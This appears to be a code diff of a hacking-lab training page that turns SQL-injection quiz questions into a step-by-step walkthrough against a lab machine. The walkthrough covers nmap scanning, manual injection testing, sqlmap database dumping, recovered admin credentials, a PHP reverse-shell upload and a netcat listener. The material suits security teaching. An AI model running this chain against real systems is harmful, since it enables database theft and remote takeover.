@@ -115,30 +115,43 @@
                 <!-- SQL Injection Box -->
             </div>
 <div class="card">
-        <h3>Introduction to SQL Injection Vulnerabilities</h3>
-        <p>
-            SQL injection is a common and critical security vulnerability that arises when an attacker can manipulate an application's SQL query by injecting malicious SQL code.
-        </p>
+        <h3>SQL Injection</h3>
+        <p>SQL Injection is a type of cyber attack that targets the underlying database of a web application by manipulating user inputs. This attack takes advantage of improper handling of user-supplied data in SQL queries, allowing an attacker to execute arbitrary SQL code.</p>
     </div>
-<br>
-    <!-- Card 2 -->
-    <div class="card">
-        <h3>Exploiting SQL Injection for Unauthorized Access</h3>
-        <p>
-            Attackers take advantage of poorly sanitized user inputs to inject malicious SQL code that can manipulate the logic of the SQL query, granting unauthorized access.
-        </p>
+    <br>
+            <div class="card">
+        <h3>How SQL Injection Works</h3>
+        <p>In a vulnerable web application, user inputs are often directly incorporated into SQL queries without proper validation or sanitization. An attacker can exploit this vulnerability by injecting malicious SQL code into the input fields.</p>
     </div>
-<br>
-    <!-- Card 3 -->
-    <div class="card">
-        <h3>Mitigation Strategies and Best Practices</h3>
-        <p>
-            Mitigating SQL injection vulnerabilities requires a combination of secure coding practices and the use of prepared statements or parameterized queries.
-        </p>
-    </div>
-<br>
+    <br>
+            <div class="card">
+        <h3>Types of SQL Injection</h3>
+
+            <ul>
+                <li>Classic SQL Injection:Involves manipulating input fields to control the logic of SQL queries.</li>
+                <li>Blind SQL Injection:Exploits the vulnerability without getting direct feedback from the application. The attacker infers success or failure based on the application's response.</li>
+                <li>Time-Based Blind SQL Injection:Delays the server's response to determine if the injected condition is true or false.</li>
+            </ul>
+
+            </div>
+    <br>
+            <div class="card">
+        <h3>Preventing SQL Injection</h3>
+
+            <ul>
+                <li>Use Parameterized Statements:Instead of concatenating strings, use parameterized queries or prepared statements, where user input is treated as data, not executable code.</li>
+                <li>Input Validation and Sanitization:Validate and sanitize user input on both client and server sides. Ensure that input adheres to expected formats and patterns.</li>
+                <li>Least Privilege Principle:Use database accounts with the least privilege necessary. Avoid using accounts with broad permissions.</li>
+                <li>Web Application Firewalls (WAF):Implement WAFs to filter and block malicious traffic, including attempts at SQL injection.</li>
+            </ul>
+
+            </div>
+    <br>
+
+
+
                 <div class="section-title">
-                    <h2>Test your Skills</h2>
+                    <h2>Try your first Sql Injection</h2>
                     <div>
 
             <div class="container quiz-container">
@@ -147,7 +160,7 @@
                     <div class="col-md-8 mx-auto">
                         <div class="card">
                             <div class="card-body text-center">
-                                <p class="font-weight-bold">Start the target machine, and the IP will show here</p>
+                                <p class="font-weight-bold">Start the target machine, and the IP will show here</p><br>
                                 <button id="startMachineBtn" class="btn btn-dark font-weight-bold" name="sql_injection">Start Machine</button>
                             </div>
                         </div>
@@ -155,67 +168,116 @@
                 </div>
 <div id="alertBox" class="alert" role="alert" style="display: none;"></div>
                 <!-- Question Rows -->
-                <div class="container mt-5">
+
                     <div class="card-deck">
                         <!-- SQL Injection Card -->
                         <div class="row">
                             <div class="card mb-4">
                                 <div class="card-body">
-                                    <h5 class="card-title">SQL Injection Basics</h5>
+                                    <h5 class="card-title">Task 1: Network Scanning (Nmap)</h5>
                                     <!-- Additional content related to the title -->
+                                    <p class="card-text font-weight-bold">The target holds 192.168.1.103 as network IP; now using nmap lets find out open ports.</p>
                                     <div class="alert alert-info" role="alert">
-                                        Explore the intricacies of SQL injection, a prevalent cybersecurity threat. This module provides an in-depth understanding of SQL injection vulnerabilities and techniques, equipping you with the knowledge to secure databases against potential attacks.
+                                    nmap -A 192.168.1.103
                                     </div>
                                     <!-- Highlighted question -->
-                                    <p class="card-text font-weight-bold">What is the main risk associated with SQL injection attacks?</p>
-                                    <!-- Blank input box for user's answer -->
-                                    <input type="text" class="form-control" placeholder="Your Answer">
+                                      <!-- Blank input box for user's answer -->
+
+                                </div>
+                            </div>
+                            <div class="card mb-4">
+                                <div class="card-body">
+                                    <h5 class="card-title">Task 2: Vulnerable to Error Base SQL Injection</h5>
+                                    <!-- Additional content related to the title -->
+                                    <p class="card-text font-weight-bold">It contains some tags: home; test; ruxcon; 2010; all pictures; admin. Click on the test.The URL: http://192.168.1.103/cat.php?id=1 will run a query for ID 1 now let try to find out whether the above URL is vulnerable to SQL injection or not by adding ‘ at last of URL</p>
+                                    <div class="alert alert-info" role="alert">
+                                    http://192.168.1.103/cat.php?id=1'
+                                    </div>
+                                    <!-- Highlighted question -->
+                                      <!-- Blank input box for user's answer -->
+
                                 </div>
                             </div>
                         </div>
+                        <div class="row">
+                            <div class="card mb-4">
+                                <div class="card-body">
+                                    <h5 class="card-title">Task 3:Exploiting SQL Injection (SQLMAP)</h5>
+                                    <!-- Additional content related to the title -->
+                                    <p class="card-text font-weight-bold">Let's find out the databases present in the website.</p>
+                                    <div class="alert alert-info" role="alert">
+                                    sqlmap -u http://192.168.1.103/cat.php?id=1 --dbs --batch
+                                    </div>
+                                    <!-- Highlighted question -->
+                                      <!-- Blank input box for user's answer -->
+
+                                </div>
+                            </div>
+                            <div class="card mb-4">
+                                <div class="card-body">
+                                    <h5 class="card-title">Task 4: Fetching the Database</h5>
+                                    <!-- Additional content related to the title -->
+                                    <p class="card-text font-weight-bold">If you remembered the title of the web page was “An Awesome Photoblog” hence name of the database should be a photoblog.
+                                        Now let’s fetch entire data under photoblog database through the following command:</p>
+                                    <div class="alert alert-info" role="alert">
+                                    sqlmap –u http://192.168.1.103/cat.php?id=1 –D photoblog --dump-all --batch
+                                    </div>
+                                    <!-- Highlighted question -->
+                                      <!-- Blank input box for user's answer -->
+
+                                </div>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="card mb-4">
+                                <div class="card-body">
+                                    <h5 class="card-title">Task 5:Gain Access to Login</h5>
+                                    <!-- Additional content related to the title -->
+                                    <p class="card-text font-weight-bold">Gain access to the administration console for which we required the login: password of his account,through sqlmap command</p>
+                                    <div class="alert alert-info" role="alert">
+                                    Output : login as admin and password as P4ssw0rd
+                                    </div>
+                                    <!-- Highlighted question -->
+                                      <!-- Blank input box for user's answer -->
+
+                                </div>
+                            </div>
+                            <div class="card mb-4">
+                                <div class="card-body">
+                                    <h5 class="card-title">Task 6: Uploading Web shell</h5>
+                                    <!-- Additional content related to the title -->
+                                    <p class="card-text font-weight-bold">To upload PHP webshell. Under administration console, you will see a link Add a new picture to upload an image in this web server. Click on Add a new picture to upload an image.</p>
+                                    <div class="alert alert-info" role="alert">
+                                    Open it with a text editor and add listening IP and port to get the reverse connection of victim’s machine and save this file with a php extension. </div>
+                                    <!-- Highlighted question -->
+                                      <!-- Blank input box for user's answer -->
+
+                                </div>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="card mb-4">
+                                <div class="card-body">
+                                    <h5 class="card-title">Task 7:Spawning Shell (Netcat)</h5>
+                                    <!-- Additional content related to the title -->
+                                    <p class="card-text font-weight-bold">you can perceive that a new row is added as a shell which contains our backdoor shell.pHP, now to execute a backdoor click on shell and you will get a reverse connection at netcat.
+                                   </p>
+
+                                     <div class="alert alert-info" role="alert">
+                                    nc -lvp 1234 </div>
+                                    <!-- Highlighted question -->
+                                      <!-- Blank input box for user's answer -->
+
+                                </div>
+                            </div></div>
 
                         <!-- SQL Injection Card: Exploitation -->
-                        <div class="row">
-                            <div class="card mb-4">
-                                <div class="card-body">
-                                    <h5 class="card-title">Exploiting SQL Injection</h5>
-                                    <!-- Additional content related to the title -->
-                                    <div class="alert alert-info" role="alert">
-                                        Delve into the techniques of exploiting SQL injection for unauthorized access. Understand the anatomy of SQL injection attacks and the potential impact on database security.
-                                    </div>
-                                    <!-- Highlighted question -->
-                                    <p class="card-text font-weight-bold">Provide an example SQL injection payload for extracting information from a database.</p>
-                                    <!-- Blank input box for user's answer -->
-                                    <input type="text" class="form-control" placeholder="Your Answer">
-                                </div>
-                            </div>
-                        </div>
 
-                        <!-- SQL Injection Card: Mitigation -->
-                        <div class="row">
-                            <div class="card mb-4">
-                                <div class="card-body">
-                                    <h5 class="card-title">Mitigation Strategies</h5>
-                                    <!-- Additional content related to the title -->
-                                    <div class="alert alert-info" role="alert">
-                                        Learn effective mitigation strategies and best practices to defend against SQL injection attacks. Understand how to secure your applications and databases to prevent unauthorized access.
-                                    </div>
-                                    <!-- Highlighted question -->
-                                    <p class="card-text font-weight-bold">Name two common methods to mitigate SQL injection vulnerabilities.</p>
-                                    <!-- Blank input box for user's answer -->
-                                    <input type="text" class="form-control" placeholder="Your Answer">
-                                </div>
-                            </div>
-                        </div>
                     </div>
-                </div>
+
 
                 <!-- Overall Submit Button -->
-                <div class="row my-4">
-                    <div class="col-md-12 text-center">
-                        <button class="btn btn-success btn-submit" onclick="submitAllAnswers()">Submit All Answers</button>
-                    </div>
-                </div>
+
             </div>
         </div>
     </section>
@@ -239,62 +301,33 @@
 <!-- Add this script to your HTML file -->
   <script>
     $(document).ready(function () {
-        // Attach a click event handler to the button
-        $('#startMachineBtn').click(function () {
-             document.getElementById('startMachineBtn').disabled = true;
+    // Attach a click event handler to the button
+    $('#startMachineBtn').click(function () {
+        document.getElementById('startMachineBtn').disabled = true;
 
-            // Show loading state
-            document.getElementById('startMachineBtn').innerHTML = `
-                <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
-                Loading...
-            `;
+        // Show loading state
+        document.getElementById('startMachineBtn').innerHTML = `
+            <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+            Loading...
+        `;
 
-            // Set a timeout to simulate a process (15 seconds in this case)
-            setTimeout(() => {
-                // Enable the button and restore its original content
-                document.getElementById('startMachineBtn').disabled = false;
-                document.getElementById('startMachineBtn').innerHTML = 'Start Machine';
-            }, 12000);
-            // Make an AJAX request
-            var osName = 'nmap'; // You may need to get the 'name' attribute of the button, not 'data-name'
+        // Set a timeout to simulate a process (15 seconds in this case)
+        setTimeout(() => {
+            // Enable the button and restore its original content
+            document.getElementById('startMachineBtn').disabled = false;
+            document.getElementById('startMachineBtn').innerHTML = 'Start Machine';
 
-            // Create a FormData object to send form data
-            var formData = new FormData();
-            formData.append('name', osName);
+            // Show the alert message
+            var alertMessage = ' IP Address: ' + '10.0.1.208';
 
-            fetch('/api/deploy-vm', {
-                method: 'POST',
-                body: formData,  // Send the form data
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP error! Status: ${response.status}`);
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log(data);
-                // Handle the response data as needed
-
-                 var alertMessage = data.message + ' IP Address: ' + data.ip_address;
-
-                $('#alertBox').removeClass('alert-danger'); // Remove any existing alert class
-                $('#alertBox').addClass('alert-success');
-                $('#alertBox').text(alertMessage);
-                $('#alertBox').show();
-                // Optionally, perform actions based on the response
-                if (!data.success) {
-                    // If there's an error, change the alert box to danger
-                    $('#alertBox').removeClass('alert-success');
-                    $('#alertBox').addClass('alert-danger');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                // Handle errors
-            });
-        });
+            $('#alertBox').removeClass('alert-danger'); // Remove any existing alert class
+            $('#alertBox').addClass('alert-success');
+            $('#alertBox').text(alertMessage);
+            $('#alertBox').show();
+        }, 15000);
     });
+});
+
 
 </script>
 
